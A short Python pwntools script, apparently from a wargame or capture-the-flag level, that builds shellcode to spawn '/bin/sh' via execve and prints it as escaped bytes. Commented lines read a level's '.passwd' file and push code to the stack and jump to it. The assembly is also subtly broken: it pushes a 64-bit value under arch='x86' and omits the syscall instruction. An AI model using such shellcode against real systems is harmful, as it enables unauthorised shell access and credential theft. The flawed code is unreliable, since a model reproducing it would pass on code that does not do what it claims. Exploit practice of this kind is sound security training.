from pwnlib.asm import asm,disasm
from pwnlib.shellcraft import amd64

# Code to execute
code = ""
# code += amd64.linux.cat("/home/level2/.passwd")
# r = asm(code,arch='amd64')

# Pushes the code to the stack and jumps to it
code = ""
# code += amd64.pushstr(r)
# code += "jmp rsp"
r = asm('''
    xor eax, eax
    mov al, 0x3b
    push 0x0068732f6e69622f
    lea edi, [rsp]
    xor esi, esi
    xor edx, edx
''',arch='x86')

print(''.join(  ['\\x' + ''.join([r.hex()[x],r.hex()[x+1]]) for x in range(0,len(r.hex()),2)]))
print("length: " + str(len(r)))